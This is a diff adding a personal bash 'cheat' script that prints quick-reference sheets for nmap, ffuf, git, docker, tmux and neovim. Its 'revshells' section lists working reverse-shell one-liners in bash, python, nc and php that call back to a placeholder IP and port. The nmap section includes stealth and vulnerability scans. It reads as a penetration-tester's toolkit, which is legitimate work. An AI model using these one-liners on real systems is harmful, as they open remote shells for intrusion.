@@ -1,0 +1,120 @@
+#!/usr/bin/env bash
+# =============================================================================
+# cheat -- Quick reference for common commands
+# Usage: cheat <topic>
+# =============================================================================
+
+topic="${1:-help}"
+
+case "$topic" in
+  nmap)
+    cat << 'EOF'
+nmap cheatsheet
+  nmap -sn 10.10.10.0/24              # Ping sweep
+  nmap -sV -sC -T4 <target>           # Service + scripts
+  nmap -sV -sC -A -T4 -p- <target>    # Full port scan
+  sudo nmap -sS -T2 -f <target>       # Stealth SYN
+  sudo nmap -sU -sV -T4 <target>      # UDP scan
+  nmap --script vuln <target>          # Vuln scripts
+  nmap -sV --script=banner <target>    # Banner grab
+  nmap -oA output <target>             # Save all formats
+EOF
+    ;;
+  ffuf)
+    cat << 'EOF'
+ffuf cheatsheet
+  ffuf -u URL/FUZZ -w wordlist.txt                      # Dir brute
+  ffuf -u URL -w wordlist.txt -H "Host: FUZZ.site.com"  # Vhost
+  ffuf -u URL?FUZZ=value -w params.txt                  # Param fuzz
+  ffuf -u URL -w wordlist.txt -mc 200,301 -fc 404       # Filter codes
+  ffuf -u URL/FUZZ -w wordlist.txt -e .php,.html,.txt   # Extensions
+  ffuf -u URL -d "user=FUZZ&pass=test" -w users.txt     # POST fuzz
+EOF
+    ;;
+  revshells)
+    cat << 'EOF'
+Reverse shells
+  bash -i >& /dev/tcp/IP/PORT 0>&1
+  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+  nc -e /bin/sh IP PORT
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f
+  php -r '$s=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
+
+Upgrade shell:
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl-Z -> stty raw -echo; fg -> export TERM=xterm-256color
+EOF
+    ;;
+  git)
+    cat << 'EOF'
+git cheatsheet
+  git log --oneline --graph --all      # Visual log
+  git diff --staged                    # Staged changes
+  git stash && git stash pop           # Stash / restore
+  git rebase -i HEAD~N                 # Interactive rebase
+  git bisect start/bad/good            # Binary search bug
+  git reflog                           # Recovery log
+  git cherry-pick <sha>                # Pick commit
+  git reset --soft HEAD~1              # Undo last commit (keep changes)
+  git push --force-with-lease          # Safe force push
+EOF
+    ;;
+  docker)
+    cat << 'EOF'
+docker cheatsheet
+  docker ps -a                         # All containers
+  docker images                        # All images
+  docker exec -it <id> /bin/sh         # Shell into container
+  docker logs -f <id>                  # Follow logs
+  docker system prune -af              # Nuke everything
+  docker build -t name .               # Build image
+  docker compose up -d                 # Start stack
+  docker compose down -v               # Tear down + volumes
+  docker save img > img.tar            # Export image
+  docker load < img.tar                # Import image
+EOF
+    ;;
+  tmux)
+    cat << 'EOF'
+tmux cheatsheet (prefix = Ctrl-a)
+  C-a |         split horizontal
+  C-a -         split vertical
+  C-a h/j/k/l  navigate panes
+  C-a c         new window
+  C-a n/p       next/prev window
+  C-a d         detach
+  C-a g         lazygit popup
+  C-a b         btop popup
+  C-a f         fzf file finder
+  C-a S         new session
+  C-a $         rename session
+  C-a s         list sessions
+EOF
+    ;;
+  nvim)
+    cat << 'EOF'
+nvim cheatsheet (leader = Space)
+  <leader>ff    find files         <leader>fg    live grep
+  <leader>fb    buffers            <leader>fr    recent files
+  <leader>t     file tree          <leader>xH    hex editor
+  <leader>ca    code action        <leader>rn    rename
+  gd            go to definition   gr            references
+  <leader>db    breakpoint         <leader>dc    debug continue
+  <leader>th    terminal (horiz)   <leader>tf    terminal (float)
+  <leader>gg    git fugitive       <leader>gs    git status
+  <leader>cf    format buffer      <leader>xx    diagnostics
+EOF
+    ;;
+  help|*)
+    cat << 'EOF'
+cheat -- quick reference sheets
+  cheat nmap       nmap scanning
+  cheat ffuf       web fuzzing
+  cheat revshells  reverse shell one-liners
+  cheat git        git workflows
+  cheat docker     docker commands
+  cheat tmux       tmux keybinds
+  cheat nvim       neovim keybinds
+EOF
+    ;;
+esac
